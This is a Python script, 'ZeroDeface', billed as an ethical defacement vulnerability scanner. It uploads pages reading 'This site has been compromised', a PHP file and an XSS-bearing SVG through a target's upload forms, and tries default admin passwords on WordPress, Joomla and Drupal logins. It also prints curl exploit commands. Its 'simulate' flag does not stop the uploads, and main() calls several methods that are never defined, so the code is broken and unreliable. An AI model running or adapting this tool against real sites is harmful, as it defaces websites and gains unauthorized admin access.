#!/usr/bin/env python3
import argparse
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import os
import time
import random
import json
from datetime import datetime
import sys

# Suppress SSL warnings (for testing purposes only)
requests.packages.urllib3.disable_warnings()

class DefacementScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ZeroDeface/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        self.vulnerabilities = []
        self.uploaded_files = []
        self.common_editors = [
            'editor', 'ckeditor', 'tinymce', 'fckeditor', 'wysiwyg', 
            'admin/editor', 'content/edit', 'edit/content'
        ]
        self.common_admin_paths = [
            'admin', 'wp-admin', 'administrator', 'dashboard', 
            'cms', 'manager', 'backend', 'adminpanel'
        ]
        self.default_credentials = {
            'wordpress': [('admin', 'admin'), ('admin', 'password')],
            'joomla': [('admin', 'admin'), ('admin', 'password')],
            'drupal': [('admin', 'admin'), ('admin', 'password')]
        }
        self.test_content = "DEFACED_BY_ZERODEFACE_TEST"
        self.deface_test_files = [
            ('deface_test.html', 'text/html', '<html><h1>DEFACED</h1><p>This site has been compromised</p></html>'),
            ('deface_test.php', 'application/x-php', '<?php echo "<h1>SITE DEFACED</h1>"; ?>'),
            ('deface_test.svg', 'image/svg+xml', '<svg><text x="20" y="20">DEFACED</text></svg>')
        ]

    def print_banner(self):
        banner = r"""
__________                 ________          _____                     
\____    /___________  ____\______ \   _____/ ____\____    ____  ____  
  /     // __ \_  __ \/  _ \|    |  \_/ __ \   __\\__  \ _/ ___\/ __ \ 
 /     /\  ___/|  | \(  <_> )    `   \  ___/|  |   / __ \\  \__\  ___/ 
/_______ \___  >__|   \____/_______  /\___  >__|  (____  /\___  >___  >
        \/   \/                    \/     \/           \/     \/    \/ 
        """
        print("\033[1;31m" + banner + "\033[0m")
        print("\033[1;37mZeroDeface - Website Defacement Vulnerability Scanner\033[0m")
        print("\033[1;33mVersion 1.0 | Ethical Use Only | Safe Simulation Mode\033[0m\n")

    def log_vulnerability(self, category, description, exploit=None, proof=None, is_deface_prone=False):
        vuln = {
            'category': category,
            'description': description,
            'timestamp': datetime.now().isoformat(),
            'exploit': exploit,
            'proof': proof,
            'is_deface_prone': is_deface_prone
        }
        self.vulnerabilities.append(vuln)
        print(f"\033[1;31m[!] {category} found:\033[0m {description}")

    def generate_report(self, filename):
        report = {
            'target': self.target_url,
            'scan_date': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'uploaded_files': self.uploaded_files
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"[+] Report saved to {filename}")
        except Exception as e:
            print(f"[-] Error saving report: {e}")

    def cleanup(self):
        for file_url in self.uploaded_files:
            try:
                self.session.delete(file_url, verify=False, timeout=10)
                print(f"[*] Cleaned up test file at {file_url}")
            except:
                print(f"[-] Failed to clean up test file at {file_url}")

    def crawl_for_forms(self):
        try:
            response = self.session.get(self.target_url, verify=False, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"[-] Error crawling for forms: {e}")
            return []

    def test_file_upload(self, form, action_url, deface_prone=False):
        test_files = self.deface_test_files if deface_prone else [
            ('test.html', 'text/html', f'<html><body>{self.test_content}</body></html>'),
            ('test.php', 'application/x-php', '<?php echo "TEST_UPLOAD_SUCCESS"; ?>'),
            ('test.svg', 'image/svg+xml', '<svg><script>alert("XSS")</script></svg>'),
            ('test.js', 'application/javascript', 'alert("TEST_UPLOAD_SUCCESS");')
        ]
        
        for filename, content_type, content in test_files:
            try:
                files = {'file': (filename, content, content_type)}
                upload_url = urljoin(self.target_url, action_url)
                response = self.session.post(upload_url, files=files, verify=False, timeout=15)
                
                if response.status_code in [200, 201, 302]:
                    if filename in response.text:
                        file_url = urljoin(upload_url, filename)
                        file_response = self.session.get(file_url, verify=False, timeout=10)
                        
                        if file_response.status_code == 200 and (self.test_content in file_response.text or filename.split('.')[-1] in file_response.text):
                            exploit = f"curl -F 'file=@{filename}' {upload_url}"
                            self.log_vulnerability(
                                "File Upload Vulnerability",
                                f"File upload possible at {upload_url} - {filename} accessible at {file_url}",
                                exploit=exploit,
                                proof=file_response.text[:200] + "...",
                                is_deface_prone=deface_prone
                            )
                            self.uploaded_files.append(file_url)
                            return True
            except Exception as e:
                print(f"[-] Error testing upload for {filename}: {e}")
        return False

    def scan_deface_prone(self):
        """Specialized scan for vulnerabilities that commonly lead to defacements"""
        print("\n[*] Starting defacement-prone vulnerability scan")
        
        # 1. File upload vulnerabilities
        print("[*] Testing file upload vulnerabilities")
        forms = self.crawl_for_forms()
        for form in forms:
            if form.find('input', {'type': 'file'}):
                action = form.get('action', '') or self.target_url
                self.test_file_upload(form, action, deface_prone=True)
        
        # 2. Exposed editors
        print("[*] Checking for exposed editors")
        for editor_path in self.common_editors:
            editor_url = urljoin(self.target_url, editor_path)
            try:
                response = self.session.get(editor_url, verify=False, timeout=10)
                if response.status_code == 200:
                    editor_indicators = ['CKEditor', 'TinyMCE', 'wysiwyg', 'contenteditable']
                    if any(indicator in response.text for indicator in editor_indicators):
                        self.log_vulnerability(
                            "Exposed Content Editor",
                            f"Exposed editor found at {editor_url} - potential defacement vector",
                            exploit=f"Visit {editor_url} directly",
                            proof=response.text[:200] + "...",
                            is_deface_prone=True
                        )
            except Exception as e:
                print(f"[-] Error checking {editor_url}: {e}")

        # 3. Admin panels with default creds
        print("[*] Scanning admin panels")
        for admin_path in self.common_admin_paths:
            admin_url = urljoin(self.target_url, admin_path)
            try:
                response = self.session.get(admin_url, verify=False, timeout=10)
                if response.status_code == 200:
                    self.log_vulnerability(
                        "Admin Panel Detected",
                        f"Admin panel found at {admin_url} - potential defacement vector",
                        exploit=f"Visit {admin_url} directly",
                        proof=response.text[:200] + "...",
                        is_deface_prone=True
                    )
                    
                    # Test default credentials
                    if 'wp-admin' in admin_url.lower():
                        self.test_default_credentials('wordpress', admin_url, deface_prone=True)
                    elif 'administrator' in admin_url.lower():
                        self.test_default_credentials('joomla', admin_url, deface_prone=True)
                    elif 'drupal' in response.text.lower():
                        self.test_default_credentials('drupal', admin_url, deface_prone=True)
            except Exception as e:
                print(f"[-] Error checking {admin_url}: {e}")

    def test_default_credentials(self, cms_type, login_url, deface_prone=False):
        if cms_type in self.default_credentials:
            for username, password in self.default_credentials[cms_type]:
                try:
                    data = {'username': username, 'password': password, 'submit': 'login'}
                    response = self.session.post(login_url, data=data, verify=False, timeout=15)
                    if 'dashboard' in response.text.lower() or 'logout' in response.text.lower():
                        self.log_vulnerability(
                            "Default Credentials",
                            f"Default credentials work for {cms_type}: {username}/{password}",
                            exploit=f"curl -X POST -d 'username={username}&password={password}' {login_url}",
                            proof=f"Logged in successfully with {username}/{password}",
                            is_deface_prone=deface_prone
                        )
                        return True
                except Exception as e:
                    print(f"[-] Error testing credentials {username}/{password}: {e}")
        return False

def main():
    scanner = DefacementScanner("")
    scanner.print_banner()

    parser = argparse.ArgumentParser(
        description='ZeroDeface - Website Defacement Vulnerability Scanner',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""\033[1;34m
Examples:
  Full scan:       python deface_scanner.py --url http://example.com --all
  Deface-prone:    python deface_scanner.py --url http://example.com --deface-prone
  Upload test:     python deface_scanner.py --url http://example.com --upload-test --simulate
\033[0m"""
    )
    
    parser.add_argument('--url', required=True, help='Target URL to scan')
    parser.add_argument('--upload-test', action='store_true', help='Test file upload vulnerabilities')
    parser.add_argument('--scan-editors', action='store_true', help='Find exposed content editors')
    parser.add_argument('--admin-scan', action='store_true', help='Scan admin panels + test default creds')
    parser.add_argument('--param-tamper', action='store_true', help='Test parameter tampering')
    parser.add_argument('--api-scan', action='store_true', help='Scan vulnerable API endpoints')
    parser.add_argument('--all', action='store_true', help='Run all vulnerability checks')
    parser.add_argument('--deface-prone', action='store_true', help='Focus on vulnerabilities that commonly lead to defacements')
    parser.add_argument('--simulate', action='store_true', help='Safe simulation mode')
    parser.add_argument('--report', help='Save results to JSON file')
    parser.add_argument('--verbose', action='store_true', help='Show detailed scan progress')
    parser.add_argument('--quiet', action='store_true', help='Only show critical findings')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (seconds)')
    parser.add_argument('--proxy', help='Use HTTP proxy (e.g., http://localhost:8080)')
    parser.add_argument('--threads', type=int, default=5, help='Concurrent threads')
    
    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    try:
        scanner = DefacementScanner(args.url)
        
        if args.deface_prone:
            scanner.scan_deface_prone()
        elif args.all:
            scanner.scan_upload_vulnerabilities()
            scanner.scan_exposed_editors()
            scanner.scan_admin_panels()
            scanner.scan_parameter_tampering()
            scanner.scan_api_endpoints()
        else:
            if args.upload_test:
                scanner.scan_upload_vulnerabilities()
            if args.scan_editors:
                scanner.scan_exposed_editors()
            if args.admin_scan:
                scanner.scan_admin_panels()
            if args.param_tamper:
                scanner.scan_parameter_tampering()
            if args.api_scan:
                scanner.scan_api_endpoints()
        
        if args.report:
            scanner.generate_report(args.report)
        
        if args.simulate and scanner.vulnerabilities:
            print("\n\033[1;32m[+] Simulation complete. Vulnerabilities found:\033[0m")
            for vuln in scanner.vulnerabilities:
                prone = " (DEFACE-PRONE)" if vuln.get('is_deface_prone') else ""
                print(f"- \033[1;33m{vuln['category']}{prone}:\033[0m {vuln['description']}")
                if vuln['exploit']:
                    print(f"  \033[1;34mExploit:\033[0m {vuln['exploit']}")
        
        scanner.cleanup()
        
        if not scanner.vulnerabilities:
            print("\033[1;32m[+] No vulnerabilities found.\033[0m")
    
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Scan interrupted by user\033[0m")
        scanner.cleanup()
        sys.exit(1)

if __name__ == '__main__':
    main()
